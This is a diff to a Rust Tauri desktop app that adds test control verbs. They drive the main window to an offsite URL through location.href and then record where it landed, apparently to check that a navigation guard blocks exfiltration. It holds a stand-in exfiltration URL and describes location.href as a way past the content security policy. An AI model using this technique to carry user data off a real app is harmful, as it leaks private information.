@@ -35,6 +35,19 @@ pub const FILE_NAME: &str = ".desktop-control.sock";
 const CLOSE_WINDOW: &str = "close-window";
 /// Destroy the main window outright, so the next open must rebuild it.
 const DESTROY_WINDOW: &str = "destroy-window";
+/// Ask the frontend to navigate off the application's origin.
+const NAVIGATE_OFFSITE: &str = "navigate-offsite";
+/// Record where the main window actually is.
+const RECORD_WINDOW_URL: &str = "record-window-url";
+
+/// Where [`NAVIGATE_OFFSITE`] tries to go.
+///
+/// `.invalid` is reserved by RFC 2606 and resolves nowhere, so a run
+/// that somehow reached the network would still not reach a host. The
+/// query string stands in for what a real exfiltration would carry:
+/// the session titles and configuration paths the granted commands
+/// return.
+const OFFSITE_URL: &str = "https://exfiltration.invalid/?titles=probe";
 
 /// Starts accepting control verbs, one per line, one per connection.
 ///
@@ -107,6 +120,8 @@ fn run(app: &tauri::AppHandle, verb: &str) {
     match verb {
         CLOSE_WINDOW => close(app),
         DESTROY_WINDOW => destroy(app),
+        NAVIGATE_OFFSITE => navigate_offsite(app),
+        RECORD_WINDOW_URL => record_window_url(app),
         // Everything else is a tray menu item identity, dispatched
         // through the same function the platform's menu event uses.
         item => tray::activate(app, item),
@@ -135,6 +150,40 @@ fn destroy(app: &tauri::AppHandle) {
     };
     if let Err(error) = main.destroy() {
         eprintln!("scrybe-desktop: could not destroy the main window: {error}");
+    }
+}
+
+/// Drives a top-level navigation off the application's origin, from
+/// the frontend, the way frontend code execution would.
+///
+/// `location.href` is the path the content security policy cannot see:
+/// it is not a fetch, a `WebSocket`, a beacon, or an iframe. Whether it
+/// is refused is decided by the navigation guard alone, so this is how
+/// a qualification run establishes the guard exists rather than
+/// assuming it.
+fn navigate_offsite(app: &tauri::AppHandle) {
+    let Some(main) = app.get_webview_window(window::MAIN) else {
+        eprintln!("scrybe-desktop: no main window to navigate");
+        return;
+    };
+    crate::note!(app, "navigation-attempted", OFFSITE_URL);
+    if let Err(error) = main.eval(format!("location.href = {OFFSITE_URL:?}")) {
+        eprintln!("scrybe-desktop: could not drive a navigation: {error}");
+    }
+}
+
+/// Records where the main window is now.
+///
+/// Sent after [`NAVIGATE_OFFSITE`] has had time to take effect, so the
+/// recorded URL is the answer to whether the navigation happened.
+fn record_window_url(app: &tauri::AppHandle) {
+    let Some(main) = app.get_webview_window(window::MAIN) else {
+        eprintln!("scrybe-desktop: no main window to read a URL from");
+        return;
+    };
+    match main.url() {
+        Ok(url) => crate::note!(app, "window-url", url.as_str()),
+        Err(error) => eprintln!("scrybe-desktop: could not read the main window URL: {error}"),
     }
 }
 
